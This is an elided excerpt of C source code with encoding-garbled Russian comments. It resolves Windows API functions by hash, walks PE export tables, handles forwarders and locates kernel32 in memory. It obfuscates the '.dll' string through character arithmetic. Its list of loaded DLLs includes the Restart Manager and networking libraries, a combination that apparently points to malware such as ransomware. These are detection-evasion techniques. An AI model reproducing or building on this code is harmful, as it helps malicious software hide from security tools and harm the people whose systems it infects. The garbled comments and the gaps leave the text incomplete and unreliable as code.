...
LPVOID GetProcAddressByHash(HMODULE module, DWORD api_hash, BOOL isByOrd)
{
	...
	if ((DWORD_PTR)func_find >= (DWORD_PTR)in_export && (DWORD_PTR)func_find < in_export_end) {
		// àäðåñ íàõîäèòñÿ â òàáëèöå ýêñïîðòà
		// Forwarder
...
{
	char szDll[] = { '.','c','k','m',0 };
	// Ôóíêöèÿ îáðàáîòêè ïåðåíàçíà÷åíèÿ ýêñïîðòà
	// Íà âõîäå äîëæíà áûòü ñòðîêà DllName.ProcName èëè DllName.#ProcNomber
	--szDll[3];
	szDll[1]++;
	++szDll[2];
	...
	/// Ñîáèðàåì èìÿ áèáëèîòåêè
	m_memcpy(DLLName, Name, NameStr - Name);

	strcat(DLLName, szDll);

	/// îïðåäåëÿåì èìÿ ôóíêöèè
	++NameStr;
	if (*NameStr == '#')
	{
		// Èìÿ ÿâëÿåòñÿ íîìåðîì ôóíêöèè
		++NameStr;
...
{
	/*----------- Ôóíêöèÿ âîçâðàùàåò àäðåñ ôóíêöèè ïî å¸ íàçâàíèþ -----------*/
	// Ïîëó÷àåì àäðåñ äîïîëíèòåëüíûõ PE çàãîëîâêîâ
	...
	// Ïîëó÷àåì àäðåñ òàáëèöû ýêñïîðòà
	...
	INT Ordinal; // Íîìåð íåîáõîäèìîé íàì ôóíêöèè
	BOOL Found = FALSE;

	if (HIWORD(ProcNameHash) == 0)
	{
		// Èùåì ôóíêöèþ ïî å¸ íîìåðó
		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
	}
	else
	{
		// Èùåì ôóíêöèþ ïî íîìåðó
...
{
	// Ôóíêöèÿ âîçâðàùàåò àäðåñ ôóíêöèè èñïîëüçóÿ êýø
	LPVOID Addr = NULL;


	// Ïûòàåìñÿ ïîëó÷èòü àäðåñ èç êýøà
	...
	if (!Addr)
	{
		// Ôóíêöèè íåò â êýøå. Ïîëó÷àåì å¸ àäðåñ è äîáàâëÿåì â êýø
...
)
{
	...
	LPCSTR Advapi32DLL = "Advapi32.dll";
	LPCSTR Kernel32DLL = "Kernel32.dll";
	LPCSTR Netapi32DLL = "Netapi32.dll";
	LPCSTR IphlpapiDLL = "Iphlpapi.dll";
	LPCSTR RstrtmgrDLL = "Rstrtmgr.dll";
	LPCSTR Ws2_32DLL = "ws2_32.dll";
	LPCSTR User32DLL = "User32.dll";
	LPCSTR ShlwapiDLL = "Shlwapi.dll";
	LPCSTR Shell32DLL = "Shell32.dll";
	LPCSTR Ole32DLL = "Ole32.dll";
	LPCSTR OleAut32DLL = "OleAut32.dll";
...
{
	HMODULE krnl32;
	PCWCHAR Kernel32Dll = L"Kernel32.dll";
	...
	// Òåïåðü ïîëó÷èì àäðåñ kernel32.dll
...
LPVOID WINAPI GetImageBase(LPVOID procAddr)
{
	...
	addr = (LPBYTE)((size_t)addr & 0xFFFFFFFFFFFF0000); // Ìàñêà ñ ðàñ÷¸òîì íà X86 è X64
	for (;;)
	{
